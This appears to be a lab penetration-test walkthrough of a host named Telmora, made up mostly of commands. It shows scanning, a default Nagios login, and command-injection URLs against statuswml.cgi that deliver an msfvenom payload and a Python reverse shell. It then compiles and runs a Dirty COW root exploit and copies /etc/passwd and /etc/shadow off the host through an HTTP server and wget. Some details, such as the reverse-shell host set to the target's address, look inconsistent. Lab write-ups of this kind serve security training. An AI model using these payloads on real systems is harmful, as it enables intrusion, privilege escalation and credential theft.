# Telmora 192.168.2.20
## Andrea Zonnekus 18758119

sudo nmap -sV -sC -T4 -O -Pn 192.168.2.20 -oN host\_discovery

![](telmora_steps/Aspose.Words.04c23fac-8348-40e2-801d-62f83e5e11b3.001.png)

dirb http://192.168.2.20:443 -w /usr/share/dirb/wordlists/big.txt -o https\_enum -x exts

![](telmora_steps/Aspose.Words.04c23fac-8348-40e2-801d-62f83e5e11b3.002.png)



nagios b/c guide

<https://www.ibm.com/docs/en/power8?topic=POWER8/p8ef9/p8ef9_ppim_nagios_userid.htm>

**nagiosadmina:PASSW0RD**

![](telmora_steps/Aspose.Words.04c23fac-8348-40e2-801d-62f83e5e11b3.003.png)

searchsploit nagios

![](telmora_steps/Aspose.Words.04c23fac-8348-40e2-801d-62f83e5e11b3.004.png)

![](telmora_steps/Aspose.Words.04c23fac-8348-40e2-801d-62f83e5e11b3.005.png)

http://192.168.2.20/nagios/cgi-bin/statuswml.cgi?ping=10.8.0.106%3Becho+%24PATH![Graphical user interface

![](telmora_steps/Aspose.Words.04c23fac-8348-40e2-801d-62f83e5e11b3.006.png)

![](telmora_steps/Aspose.Words.04c23fac-8348-40e2-801d-62f83e5e11b3.007.png)



http://192.168.2.20/nagios/cgi-bin/statuswml.cgi?ping=10.8.0.106%3Bgetent%20passwd

![](telmora_steps/Aspose.Words.04c23fac-8348-40e2-801d-62f83e5e11b3.008.png)

nc 192.168.2.20 80

![](telmora_steps/Aspose.Words.04c23fac-8348-40e2-801d-62f83e5e11b3.009.png)

<http://192.168.2.20/nagios/cgi-bin/statuswml.cgi?ping=10.8.0.106%3Buname%20-a>

![](telmora_steps/Aspose.Words.04c23fac-8348-40e2-801d-62f83e5e11b3.010.png)

msfvenom -p linux/x86/shell/reverse\_tcp LHOST=192.168.2.20 LPORT=4444 --format=base64 --arch=x86

![](telmora_steps/Aspose.Words.04c23fac-8348-40e2-801d-62f83e5e11b3.011.png)

192.168.2.20/nagios/cgi-bin/statuswml.cgi?ping=10.8.0.106%3B`echo%20%22agpeMdv341NDU2oCsGaJ4c2Al1towKgCFGgCABFcieFqZlhQUVeJ4UPNgIXAeRlOdD1oogAAAFhqAGoFieMxyc2AhcB5vesnsge5ABAAAInjwesMweMMsH3NgIXAeBBbieGZsiSwA82AhcB4Av/huAEAAAC7AQAAAM2A%22%20|%20base64%20-d`

![](telmora_steps/Aspose.Words.04c23fac-8348-40e2-801d-62f83e5e11b3.012.png)

at this point I blankly stare at the screen for a while (important step for exploitation)



<http://192.168.2.20/nagios/cgi-bin/statuswml.cgi?ping=;export%20RHOST=%2210.8.0.106%22;export%20RPORT=4444;python%20-c%20%27import%20socket,os,pty;s=socket.socket();s.connect((os.getenv(%22RHOST%22),int(os.getenv(%22RPORT%22))));%5bos.dup2(s.fileno(),fd)%20for%20fd%20in%20(0,1,2)%5d;pty.spawn(%22/bin/bash%22)%27>

![](telmora_steps/Aspose.Words.04c23fac-8348-40e2-801d-62f83e5e11b3.013.png)

![](telmora_steps/Aspose.Words.04c23fac-8348-40e2-801d-62f83e5e11b3.014.png)

bash –version (cannot run les)

![](telmora_steps/Aspose.Words.04c23fac-8348-40e2-801d-62f83e5e11b3.015.png)



confirm users

![](telmora_steps/Aspose.Words.04c23fac-8348-40e2-801d-62f83e5e11b3.016.png)

<https://legalhackers.com/videos/Nagios-Exploit-Command-Injection-CVE-2016-9565-2008-4796.html>

gcc poke.c -pthread -lcrypt -o cow

![](telmora_steps/Aspose.Words.04c23fac-8348-40e2-801d-62f83e5e11b3.017.png)

./cow

![](telmora_steps/Aspose.Words.04c23fac-8348-40e2-801d-62f83e5e11b3.018.png)

![](telmora_steps/Aspose.Words.04c23fac-8348-40e2-801d-62f83e5e11b3.019.png)

sudo cp /etc/passwd /tmp/

sudo cp /etc/shadow /tmp/

![](telmora_steps/Aspose.Words.04c23fac-8348-40e2-801d-62f83e5e11b3.020.png)

python -m SimpleHTTPServer 4040

![](telmora_steps/Aspose.Words.04c23fac-8348-40e2-801d-62f83e5e11b3.021.png)

wget <http://192.168.2.20:4040/passwd>

![](telmora_steps/Aspose.Words.04c23fac-8348-40e2-801d-62f83e5e11b3.022.png)

wget <http://192.168.2.20:4040/shadow>

![](telmora_steps/Aspose.Words.04c23fac-8348-40e2-801d-62f83e5e11b3.023.png)

mv /tmp/passwd.bak /etc/passwd

![](telmora_steps/Aspose.Words.04c23fac-8348-40e2-801d-62f83e5e11b3.024.png)
